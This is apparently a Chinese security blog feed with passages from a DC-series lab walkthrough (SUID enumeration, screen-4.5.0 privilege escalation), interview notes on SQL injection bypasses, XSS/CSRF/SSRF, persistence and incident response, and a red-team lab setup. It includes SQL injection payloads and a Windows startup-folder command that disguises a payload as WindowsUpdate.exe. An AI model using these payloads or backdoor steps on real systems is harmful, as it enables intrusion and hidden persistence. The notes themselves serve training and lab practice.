/></p><p>发现这个webshell用不了的，蚁剑死活连不上，那就直接反弹shell把。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801155404314.png" alt="image-20230801155404314" /></p><p>成功</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801155737701.png" alt="image-20230801155737701" /></p><p>还是msf用起来舒服。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801160134357.png" alt="image-20230801160134357" /></p><p>脏牛提权失败</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162038062.png" alt="image-20230801162038062" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure><p>发现奇怪的东西：<strong>/bin/screen-4.5.0</strong></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162544216.png" alt="image-20230801162544216" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162859923.png" alt="image-20230801162859923" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801162846831.png" alt="image-20230801162846831" /></p><p>搞定。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801163001555.png" alt="image-20230801163001555" /></p><h1 id="dc6"><a class="markdownIt-Anchor" href="#dc6"></a> DC6</h1><p>扫到一个：10.131.210.60，访问它自动转：<a href="http://wordy/%E3%80%82%E5%88%99%E6%B7%BB%E5%8A%A0host%E3%80%82">http://wordy/。则添加host。</a></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801163748438.png" alt="image-20230801163748438" /></p><p>访问，发现他是wordpress的，wpscan一扫，然后让nmap扫一下，发现22端口（ssh）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;dc1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dc1&quot;&gt;&lt;/a&gt; DC1&lt;/h1&gt;
&lt;h2 id=&quot;涉及知识点&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#涉及知识点&quot;&gt;&lt;/a&gt; 涉及知识点&lt;/h2</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="打靶" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="权限提升" scheme="https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="漏洞扫描" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计</title>
    <link href="https://j3f5.github.io/articles/2023/07/10/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://j3f5.github.io/articles/2023/07/10/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-07-10T12:14:58.000Z</published>
    <updated>2023-07-10T12:14:58.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>面试整理</title>
    <link href="https://j3f5.github.io/articles/2023/07/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/"/>
    <id>https://j3f5.github.io/articles/2023/07/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/</id>
    <published>2023-07-10T01:27:17.000Z</published>
    <updated>2023-07-10T01:27:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql"><a class="markdownIt-Anchor" href="#sql"></a> SQL</h1><h2 id="过滤逗号的sql注入如何绕过limit"><a class="markdownIt-Anchor" href="#过滤逗号的sql注入如何绕过limit"></a> 过滤逗号的SQL注入如何绕过（limit）</h2><p>使用from或者offset，具体来说</p><ol><li>如果是过滤limit后的逗号，可以使用offset来替换，例如：<code>select * from user where id &gt; 2 limit 2 offset 3</code>，等价于：<code>limit 3, 2</code>，即以下标3为开始，输出两个。</li><li>如果是过滤substr，mid等盲注需要的函数，则可使用from for代替，例如：<code>-1' and substr((select name from user where id = 1 limit 1 offset 0) from 1 for 2)</code>，相当于<code>substr(~, 1, 2)</code></li><li>其他的还可以用<code>like</code>和<code>join</code>代替（也就是不使用mid等函数，直接等于正则）。</li></ol><h1 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h1><p>防御总则：对输入做过滤，对输出做转义</p><h2 id="输出到href的xss如何防御"><a class="markdownIt-Anchor" href="#输出到href的xss如何防御"></a> 输出到href的XSS如何防御</h2><p>输出出现在<strong>a标签的href属性</strong>里面，可以使用<strong>javascript协议</strong>来执行js</p><ol><li>a标签的href属性中一般放的是URL（链接），所以我们可以规定， 这里的输入<strong>必须以http或者https开头</strong>，否则不予以输入。</li><li>再对这里进行<code>htmlspecialchars($str, ENT_QUOTES);</code>函数处理。（注：这个函数是把html特殊字符转为html实体）</li></ol><h2 id="编码与解码"><a class="markdownIt-Anchor" href="#编码与解码"></a> 编码与解码</h2><ol><li>HTML编码要在Data state（标签外部和标签的text段），标签内的属性值的位置才能被解析</li></ol><h1 id="csrf与xss"><a class="markdownIt-Anchor" href="#csrf与xss"></a> CSRF与XSS</h1><h2 id="什么是csrf"><a class="markdownIt-Anchor" href="#什么是csrf"></a> 什么是CSRF</h2><p>csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）。这个操作不是用户真正想要执行的。</p><h2 id="csrf怎么防御"><a class="markdownIt-Anchor" href="#csrf怎么防御"></a> CSRF怎么防御</h2><ol><li>当用户发送重要的请求时输入<strong>验证码</strong></li><li>设置<strong>随机TOKEN</strong> <em>—数据包的唯一值</em><ol><li>如果前后端分离，设置不了token，则设置cookie为samesite属性的</li></ol></li><li><strong>检测referer来源</strong>，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</li><li><strong>限制请求方式只能为post</strong>。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块</li></ol><h2 id="samesite防御csrf的原理"><a class="markdownIt-Anchor" href="#samesite防御csrf的原理"></a> samesite防御CSRF的原理</h2><p>原理：设置了samesite的cookie，在传输cookie的时候，会验证请求来源或地址是否是同域的，如果不同域就不传输cookie，导致伪造的网站无法接收到cookie（窃取）。</p><p>拓展：它一定能防止csrf吗？</p><ol><li>浏览器SameSite默认属性并不能完全防止CSRF攻击，<strong>超链接访问、form表单提交到新页面等攻击方式依然有效</strong></li><li>敏感业务可以设置cookie属性SameSite=Strict，防止来自站外攻击。注：samesite有三个属性。</li></ol><h2 id="json格式的csrf如何防御"><a class="markdownIt-Anchor" href="#json格式的csrf如何防御"></a> json格式的CSRF如何防御</h2><h2 id="csrf与xss的区别"><a class="markdownIt-Anchor" href="#csrf与xss的区别"></a> CSRF与XSS的区别</h2><p>区别一：</p><ul><li>CSRF：是跨站请求伪造攻击，由客户端发起，是由于没有在关键操作执行时进行是否由用户自愿发<br />起的确认，需要用户先登录网站A，获取 cookie。</li><li>XSS：跨站脚本，不需要登录。</li></ul><p>区别二：（原理的区别）</p><ul><li>CSRF：是利用网站A本身的漏洞，去请求网站A的api。</li><li>XSS：是向网站 A 注入 JS代码，然后执行 JS里的代码，篡改网站A的内容</li></ul><h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf"></a> SSRF</h1><h2 id="解释一下ssrf和如何防御"><a class="markdownIt-Anchor" href="#解释一下ssrf和如何防御"></a> 解释一下ssrf，和如何防御</h2><img src="/images/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/SSRF-16856769157974.png" alt="SSRF" style="zoom:67%;" /><h2 id="ssrf有什么攻击面可以做什么"><a class="markdownIt-Anchor" href="#ssrf有什么攻击面可以做什么"></a> ssrf有什么攻击面，可以做什么</h2><ol><li>可以使用Http/dict扫内网端口服务</li><li>可以通过dict/curl测试有什么服务</li><li>可以通过gopher来模拟发送包，发送恶意请求包攻击内网服务<ol><li>redis</li><li>sql注入</li><li>…</li></ol></li></ol><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><h2 id="phpinfo你会关注哪些信息"><a class="markdownIt-Anchor" href="#phpinfo你会关注哪些信息"></a> phpinfo你会关注哪些信息</h2><ol><li><p>绝对路径<code>(_SERVER[“SCRIPT_FILENAME”])</code></p><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/6d50a4d95030412fafc05904c6f6bbad.png" alt="请添加图片描述" /></p></li><li><p>支持程序（中间件），如redis、curl、mysql看是否支持gopher，是否开启fastcgi</p></li><li><p>真实<code>IP_SERVER[“SERVER_ADDR”]</code></p></li><li><p>敏感配置：</p><p><code>allow_url_include</code>：远程文件包含</p><p><code>allow_url_fopen</code>：远程文件读取</p><p><code>disable_functions</code>：表示禁用的函数名</p><p><code>open_basedir</code>：可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径</p><p><code>short_open_tag</code>：允许<code>&lt;??&gt;</code>这种形式，并且<code>&lt;?=</code>等价于<code>&lt;? echo</code></p></li><li><p><code>php.ini</code>配置文件配置：<code>Loaded Configuration File</code></p></li></ol><h2 id="域名相关"><a class="markdownIt-Anchor" href="#域名相关"></a> 域名相关</h2><h3 id="域名泛解析怎么处理"><a class="markdownIt-Anchor" href="#域名泛解析怎么处理"></a> 域名泛解析怎么处理</h3><p>域名泛解析就是利用通配符<code>* </code>（星号）来做次级域名以实现<strong>所有的次级域名均指向同一IP地址</strong>。如果使用Layer爆破域名得到的均会是200成功状态码，而且ttl基本一样。</p><p>判断：ping一个不可能存在的域名，如果成功了，那么就存在域名泛解析</p><p>对抗：采用<strong>IP黑名单</strong>方式。</p><ul><li>首先确定黑名单IP：多次ping随机域名，搜集固定ttl和多次出现的IP，制作黑名单</li><li>使用域名字典扫，过滤固定ttl和IP黑名单。在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。</li></ul><h2 id="cdn相关"><a class="markdownIt-Anchor" href="#cdn相关"></a> CDN相关</h2><h3 id="cdn是什么"><a class="markdownIt-Anchor" href="#cdn是什么"></a> CDN是什么</h3><p>CDN是一组不同运行商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源（html、css、js、图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，只有实际产生业务交互的时候，才会与真正的服务器进行交互</p><h3 id="cdn怎么判断"><a class="markdownIt-Anchor" href="#cdn怎么判断"></a> CDN怎么判断</h3><ol><li>多地ping，看是否有多个IP</li><li>查看响应包中是否有cdn字样</li><li>查看nslookup，看有没有多个IP地址</li></ol><h3 id="如何绕过cdn"><a class="markdownIt-Anchor" href="#如何绕过cdn"></a> 如何绕过CDN</h3><ol><li>通过邮件返回的地址解析</li><li>DNS历史查看</li><li>子域名IP查看</li><li>国外访问域名（国外ping）</li><li>文件phpinfo</li></ol><h1 id="渗透流程"><a class="markdownIt-Anchor" href="#渗透流程"></a> 渗透流程</h1><h2 id="给你一个目标如何进行渗透测试"><a class="markdownIt-Anchor" href="#给你一个目标如何进行渗透测试"></a> 给你一个目标，如何进行渗透测试</h2><ol><li>获得更多信息<ol><li>真实IP：看是否使用了CDN</li><li>子域名/旁站/C段，以及相似域名（查看该公司的资产结构，例如whois信息、招聘信息、天眼查）</li><li>是否存在waf</li></ol></li><li>对这些域名站点进行渗透<ol><li>是否使用了框架，并查看是否有历史漏洞</li><li>是否使用了有漏洞的中间件</li><li>是否使用了CMS，并查看是否有历史漏洞</li><li>点功能点，看历史请求，重点观察输入输出窗口、上传窗口，js相应API等。对每个可能的漏洞点进行测试，查看是否存在SQL/XSS/未授权访问等等漏洞</li><li>扫目录，看是否存在后台（弱口令）/敏感文件/备份文件</li></ol></li><li>漏洞利用与权限提升<ol><li>使用数据库提升权限（mysql udf、sqlserver xp_cmdshell等）</li><li>使用Linux/Windows的历史漏洞（烂土豆+令牌劫持、脏牛等等）</li></ol></li><li>清除日志数据+生成报告</li></ol><h2 id="权限维持你了解过吗"><a class="markdownIt-Anchor" href="#权限维持你了解过吗"></a> 权限维持你了解过吗</h2><p><a href="https://github.com/jas502n/sangfor/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.md">参考</a></p><h3 id="web端"><a class="markdownIt-Anchor" href="#web端"></a> Web端</h3><p>使用菜刀、冰蝎、蚁剑、哥斯拉等</p><h3 id="windows端"><a class="markdownIt-Anchor" href="#windows端"></a> Windows端</h3><ol><li><p>添加用户并将之移到管理员用户组（administrator）</p></li><li><p>粘滞键调用cmd.exe（替换sethc）</p></li><li><p>计划任务后门：上传计划任务脚本，添加并隐藏（at）</p></li><li><p>开机启动后门：<code>copy &quot;C:\Windows\Temp\payload.exe&quot; &quot;C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe&quot; /y</code></p></li><li><p>服务启动后门：上传后门程序，添加任务。（sc）</p></li><li><p>本地组策略后门（LGP）</p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230712105615163.png" alt="image-20230712105615163" style="zoom:33%;" /></li></ol><h3 id="linux端"><a class="markdownIt-Anchor" href="#linux端"></a> Linux端</h3><ol><li>计划任务，三个：<code>/etc/cron.d</code>，<code>/var/spool/crontab</code>，<code>/etc/crontab</code></li><li>root用户组</li><li>tar文件执行</li><li>启动项</li></ol><h3 id="域"><a class="markdownIt-Anchor" href="#域"></a> 域</h3><ol><li>组策略（GPO）</li></ol><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230712110417931.png" alt="image-20230712110417931" style="zoom: 33%;" /><ol start="2"><li>黄金票据</li></ol><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><h4 id="cs"><a class="markdownIt-Anchor" href="#cs"></a> CS</h4><p>与MSF一样，都需要免杀</p><h4 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h4><p>msfvenom 可用于生成正向或反向 shell 的 payload，配合 meterpreter 使用进行渗透测试相当方便，不过在实际使用时，需要进行相应的免杀处理</p><h2 id="渗透内网系统的思路"><a class="markdownIt-Anchor" href="#渗透内网系统的思路"></a> 渗透内网系统的思路</h2><p>当拿下DMZ主机的权限，可以通过扫描</p><h1 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现"></a> 漏洞复现</h1><h2 id="fastjson"><a class="markdownIt-Anchor" href="#fastjson"></a> fastjson</h2><h2 id="python-ssti"><a class="markdownIt-Anchor" href="#python-ssti"></a> python-ssti</h2><h2 id="python-字节码"><a class="markdownIt-Anchor" href="#python-字节码"></a> python-字节码</h2><h1 id="加密与解密"><a class="markdownIt-Anchor" href="#加密与解密"></a> 加密与解密</h1><h2 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64</h2><h1 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h1><p><a href="https://www.freebuf.com/articles/web/252731.html">https://www.freebuf.com/articles/web/252731.html</a></p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="各个协议层osi-tcpip"><a class="markdownIt-Anchor" href="#各个协议层osi-tcpip"></a> 各个协议层OSI TCP/IP</h2><table><thead><tr><th>OSI 七层</th><th>TCP IP 五层</th><th>协议</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td><strong>HTTP</strong> FTP</td></tr><tr><td>表示层</td><td>-</td><td>LPP</td></tr><tr><td>会话层</td><td>-</td><td>SSL TLS LDAP</td></tr><tr><td>传输层</td><td>传输层</td><td><strong>TCP UDP</strong></td></tr><tr><td>网络层</td><td>网络层</td><td>IP ICMP</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>以太网 交换机 ARP</td></tr><tr><td>物理层</td><td>物理层</td><td>光纤 集线器</td></tr></tbody></table><h2 id="浏览器解析顺序和解码顺序"><a class="markdownIt-Anchor" href="#浏览器解析顺序和解码顺序"></a> 浏览器解析顺序和解码顺序</h2><p>参考：<a href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p><p>首先要强调是一点是：浏览器的解码顺序和解析顺序是两码事。</p><p>首先要了解我们在构造xss包的时候发生了什么：</p><ol><li>在浏览器的地址栏中输入url，发送http请求头和数据，浏览器就会对其进行<strong>解码</strong>，顺序如下，解码完成传给服务器：<ol><li>HTML解码</li><li>JS解码（所以写在script里面的HTML编码没办法解码）</li><li>URL解码</li></ol></li><li>数据包通过网络传输到达远程web服务器，服务器接收到url，<strong>分析请求头</strong>，根据它找到对应资源，经过后端代码进行处理（过滤，校验），然后给前端返回响应头和数据；</li><li>浏览器接收到响应的数据后，对数据进行<strong>解析</strong>（下面要说的事）<ol><li>浏览器解析代码的顺序是：<code>HTML代码=JS代码&gt;代码</code>，即HTML代码与JS代码属于同一级，从上向下解析（导致HTML声明的对象必须要在JS代码调用前实现）</li><li>解析html标签过程中遇到<code>&lt;script&gt;</code>标签，则暂停HTML标签解析，控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改</li></ol></li></ol><h3 id="解析顺序"><a class="markdownIt-Anchor" href="#解析顺序"></a> 解析顺序</h3><p>主要分为两个过程：</p><ol><li><p>浏览器接收到响应数据后，解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表。</p></li><li><p>解析html标签过程中遇到<code>&lt;script&gt;</code>标签，则暂停HTML标签解析，控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改。</p></li></ol><p>所以浏览器解析代码的顺序是：<code>HTML代码=JS代码&gt;代码</code>，即HTML代码与JS代码属于同一级，从上向下解析（导致HTML声明的对象必须要在JS代码调用前实现），JQuery代码则是浏览器解析完HTML代码和JS代码后才会开始解析JQuery代码。</p><h3 id="解码顺序"><a class="markdownIt-Anchor" href="#解码顺序"></a> 解码顺序</h3><p>浏览器一般的解码顺序是</p><ol><li>先进行html解码</li><li>再进行javascript解码</li><li>最后再进行url解码</li></ol><p>需要注意的是这里的url解码和我们发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p><p>明白了这个顺序，我们就可以理解<code>&lt;script&gt;alert&amp;#40;'1')&lt;/script&gt;</code>是无法弹框的，因为script标签内无法解析HTML实体编码。</p><h2 id="常见的内网段有哪些他们的掩码是什么"><a class="markdownIt-Anchor" href="#常见的内网段有哪些他们的掩码是什么"></a> 常见的内网段有哪些，他们的掩码是什么</h2><ol><li><code>10.0.0.0/8 10.255.255.255/8</code></li><li><code>172.16.0.0/12 172.31.255.255/12</code></li><li><code>192.168.0.0/16 192.168.255.255/16</code></li></ol><h1 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h1><h2 id="在审项目的时候比如一个web网站简单说说思路"><a class="markdownIt-Anchor" href="#在审项目的时候比如一个web网站简单说说思路"></a> 在审项目的时候，比如一个web网站，简单说说思路</h2><h2 id="简单描述一下什么是水平越权什么是垂直越权我要发现这两类漏洞那我代码审计要注意什么地方"><a class="markdownIt-Anchor" href="#简单描述一下什么是水平越权什么是垂直越权我要发现这两类漏洞那我代码审计要注意什么地方"></a> 简单描述一下什么是水平越权，什么是垂直越权，我要发现这两类漏洞，那我代码审计要注意什么地方</h2><h1 id="招聘岗位"><a class="markdownIt-Anchor" href="#招聘岗位"></a> 招聘岗位</h1><table><thead><tr><th>公司</th><th>岗位</th><th>备注</th></tr></thead><tbody><tr><td>米哈游</td><td><a href="https://join.mihoyo.com/#/campus/position/512">应用安全运营工程师</a>：类似安全研究员</br><a href="https://join.mihoyo.com/#/campus/position/509">基础安全研发工程师</a></br><a href="https://join.mihoyo.com/#/campus/position/511">安全运营工程师</a></br><a href="https://join.mihoyo.com/#/campus/position/508">后端开发工程师（安全平台）</a></td><td>提前批7.9</td></tr><tr><td>百度</td><td><a href="https://talent.baidu.com/jobs/detail/GRADUATE/065a339e-d263-42c2-8333-5c5ba4ec6466">安全工程师</a></td><td>7.9</td></tr><tr><td>腾讯</td><td><a href="https://join.qq.com/detail.html?id=257">技术大咖招聘</a></td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sql&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sql&quot;&gt;&lt;/a&gt; SQL&lt;/h1&gt;
&lt;h2 id=&quot;过滤逗号的sql注入如何绕过limit&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#过滤逗号的sq</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="https://j3f5.github.io/articles/2023/07/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://j3f5.github.io/articles/2023/07/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2023-07-05T03:44:45.000Z</published>
    <updated>2023-07-05T03:44:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><h2 id="应急响应"><a class="markdownIt-Anchor" href="#应急响应"></a> 应急响应：</h2><p><strong>分为几个阶段</strong>：</p><p>保护阶段，分析阶段，复现阶段，修复阶段，建议阶段</p><p><strong>目的</strong>：</p><p>分析出攻击时间，攻击操作，攻击后果，安全修复等并给出合理解决方案。</p><p><strong>一般指向：</strong></p><ol><li><p>攻击者可能拿到了哪些权限，攻击可能发生在哪个部分，从最可能的开始排查</p></li><li><p>可疑文件看文件有没有毒，有没有外部链接</p></li><li><p>结合攻击指搭建平台的漏洞</p></li></ol><h2 id="必备知识点"><a class="markdownIt-Anchor" href="#必备知识点"></a> 必备知识点</h2><ol><li>熟悉常见的 WEB 安全攻击技术</li><li>熟悉相关日志启用及存储查看等</li><li>熟悉日志中记录数据分类及分析等</li></ol><h2 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h2><ol><li>收集目标服务器各类信息</li><li>部署相关分析软件及平台等</li><li>整理相关安全渗透工具指纹库</li><li>针对异常表现第一时间触发思路，从表现预估入侵面及权限面进行排查</li></ol><h2 id="有明确信息网站被入侵"><a class="markdownIt-Anchor" href="#有明确信息网站被入侵"></a> 有明确信息网站被入侵</h2><p>基于时间 基于操作 基于指纹 基于其他</p><h2 id="无明确信息网站被入侵"><a class="markdownIt-Anchor" href="#无明确信息网站被入侵"></a> 无明确信息网站被入侵</h2><ol><li>WEB 漏洞——检查源码类别及漏洞情况</li><li>中间件漏洞——检查对应版本及漏洞情况</li><li>第三方应用漏洞——检查是否存在漏洞应用</li><li>操作系统层面漏洞——检查是否存在系统漏洞</li><li>其他安全问题(口令，后门等)——检查相关应用口令及后门扫描</li></ol><h2 id="常见分析方法"><a class="markdownIt-Anchor" href="#常见分析方法"></a> 常见分析方法</h2><p><strong>指纹库搜索</strong>，<strong>日志时间分析</strong>，<strong>后门追查分析</strong>，<strong>漏洞检查分析等</strong></p><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><p>发现虚拟机用的是Inter的，我的是锐龙，没办法唤醒，绝了，暂停</p><h1 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h1><p><a href="https://www.onlinedown.net/soft/628964.htm">UserAssistView 1.02</a> <a href="https://www.cnblogs.com/xiaozi/p/12679777.html">10款常见的Webshell检测工具</a> <a href="http://www.pc6.com/softview/SoftView_195167.html">PCHunter64</a> <a href="https://github.com/EricZimmerman/AppCompatCacheParser/releases/">https://github.com/EricZimmerman/AppCompatCacheParser/releases/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基本概念&quot;&gt;&lt;/a&gt; 基本概念&lt;/h1&gt;
&lt;h2 id=&quot;应急响应&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#应急响应&quot;&gt;&lt;/a&gt; 应急响应：&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>红队靶场-2</title>
    <link href="https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/"/>
    <id>https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/</id>
    <published>2023-06-30T06:19:36.000Z</published>
    <updated>2023-06-30T06:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础环境设置"><a class="markdownIt-Anchor" href="#基础环境设置"></a> 基础环境设置</h1><h2 id="主要练习"><a class="markdownIt-Anchor" href="#主要练习"></a> 主要练习</h2><p>Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。</p><ul><li>Bypass UAC</li><li>Windows系统NTLM获取（理论知识：Windows认证）</li><li>Access Token利用（MSSQL利用）</li><li>WMI利用</li><li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li><li>域内信息收集</li><li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li><li>域凭证收集</li><li>后门技术（黄金票据/白银票据/Sid History/MOF）</li></ul><h2 id="环境设置"><a class="markdownIt-Anchor" href="#环境设置"></a> 环境设置</h2><p>密码统一为：1qaz@WSX</p><p>内网网段：10.10.10.1/24。这个设置NAT网段，所以NAT为10.10.10.0/24</p><p>DMZ网段：10.131.210.1/24。因为用的另一个笔记本进行攻击，所以，使用桥接模式，这个DMZ段的网址是路由器决定的，需要改。</p><p>测试机地址：10.131.210.104（Windows），10.131.210.172（Linux）</p><p>所以这些虚拟机的“外网”IP为：</p><ul><li><p>DC</p><ul><li>IP：10.10.10.10</li><li>OS：Windows 2012(64)</li><li>应用：AD域</li></ul></li><li><p>WEB</p><ul><li>IP1：10.10.10.80</li><li>IP2：10.131.210.32</li><li>OS：Windows 2008(64)</li><li>应用：Weblogic 10.3.6   MSSQL 2008</li></ul></li><li><p>扫了一遍发现没有开weblogic，那就开一下，进去之后搜索weblogic即可</p></li><li><p>PC</p><ul><li>IP1：10.10.10.201</li><li>IP2：10.131.210.194</li><li>OS：Windows 7(32)</li></ul></li></ul><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/%E6%8B%93%E6%89%91%E5%9B%BE.jpg" alt="img" /></p><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><p>扫网段就不扫了，我们知道有一个IP，10.131.210.32，发现端口：80、135、139、445、1433、3389、7001、49152、49153、49154、49155、49157、49158。是windows主机</p><h2 id="域信息"><a class="markdownIt-Anchor" href="#域信息"></a> 域信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|   Target_Name: DE1AY</span><br><span class="line">|   NetBIOS_Domain_Name: DE1AY</span><br><span class="line">|   NetBIOS_Computer_Name: WEB</span><br><span class="line">|   DNS_Domain_Name: de1ay.com</span><br><span class="line">|   DNS_Computer_Name: WEB.de1ay.com</span><br><span class="line">|   DNS_Tree_Name: de1ay.com</span><br><span class="line">|   Product_Version: 6.1.7601</span><br></pre></td></tr></table></figure><h2 id="mssql的版本"><a class="markdownIt-Anchor" href="#mssql的版本"></a> MSSQL的版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|   name: Microsoft SQL Server 2008 R2 SP2</span><br><span 